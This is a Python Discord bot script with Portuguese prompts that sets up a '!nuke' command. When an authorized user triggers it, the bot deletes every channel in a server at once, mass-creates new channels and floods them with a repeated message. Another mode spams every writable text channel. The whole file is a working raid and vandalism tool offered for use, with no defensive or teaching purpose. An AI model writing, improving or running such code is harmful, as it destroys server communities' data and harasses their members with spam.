import discord
from discord.ext import commands
import asyncio

# === MENU INTERATIVO ===
print("=== CONFIGURAÇÃO DO BOT ===")
token = input("Digite o token do bot: ").strip()
owner_id = input("Digite o ID do usuário autorizado: ").strip()

modo = input("Deseja que o comando !nuke DELETE todos os canais e crie novos? (s/n): ").strip().lower()
criar_canais = modo == 's'

mensagem = ""
quantidade = 0
nome_base = ""
qtd_canais = 0

if criar_canais:
    nome_base = input("Digite o nome base dos novos canais: ").strip()
    qtd_canais = int(input("Digite quantos canais deseja criar: "))
    mensagem = input("Digite a mensagem para enviar nos novos canais: ").strip()
    quantidade = int(input("Digite quantas vezes enviar a mensagem em cada canal: "))
else:
    mensagem = input("Digite a mensagem que será enviada: ").strip()
    quantidade = int(input("Digite quantas vezes enviar a mensagem por canal: "))

# === CONFIGURAÇÃO DE INTENTS ===
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"\nBot conectado como {bot.user}!")
    print("Use o comando !nuke em um servidor para executar a ação configurada.\n")

async def enviar_mensagem(channel):
    try:
        for i in range(quantidade):
            await channel.send(mensagem)
            print(f"[{channel.guild.name}] #{channel.name} ({i+1}/{quantidade}) enviado.")
    except Exception as e:
        print(f"Erro ao enviar em #{channel.name}: {e}")

async def deletar_canal(channel):
    try:
        await channel.delete()
        print(f"Canal deletado: {channel.name}")
    except Exception as e:
        print(f"Erro ao deletar {channel.name}: {e}")

async def criar_canal(guild, nome):
    try:
        channel = await guild.create_text_channel(nome)
        print(f"Canal criado: {nome}")
        return channel
    except Exception as e:
        print(f"Erro ao criar canal {nome}: {e}")
        return None

@bot.command()
async def nuke(ctx):
    if str(ctx.author.id) != str(owner_id):
        await ctx.send("Você não tem permissão para usar este comando.")
        return

    guild = ctx.guild

    if criar_canais:
        await ctx.send("Deletando todos os canais e criando novos...")

        # Deleta todos os canais em paralelo
        delete_tasks = [asyncio.create_task(deletar_canal(channel)) for channel in guild.channels]
        await asyncio.gather(*delete_tasks)

        # Cria canais e salva os objetos
        create_tasks = [asyncio.create_task(criar_canal(guild, f"{nome_base}-{i+1}")) for i in range(qtd_canais)]
        novos_canais = await asyncio.gather(*create_tasks)
        canais_validos = [c for c in novos_canais if c is not None]

        # Envia mensagens nos novos canais
        send_tasks = [asyncio.create_task(enviar_mensagem(canal)) for canal in canais_validos]
        await asyncio.gather(*send_tasks)

        await ctx.send(f"{len(canais_validos)} canais criados e mensagens enviadas com sucesso.")

    else:
        await ctx.send("Enviando mensagens em todos os canais...")

        tasks = []
        for channel in guild.text_channels:
            permissions = channel.permissions_for(guild.me)
            if permissions.send_messages and permissions.view_channel:
                tasks.append(asyncio.create_task(enviar_mensagem(channel)))
            else:
                print(f"[{guild.name}] Sem permissão para enviar em #{channel.name}")

        await asyncio.gather(*tasks)
        await ctx.send("Mensagens enviadas em todos os canais!")

bot.run(token)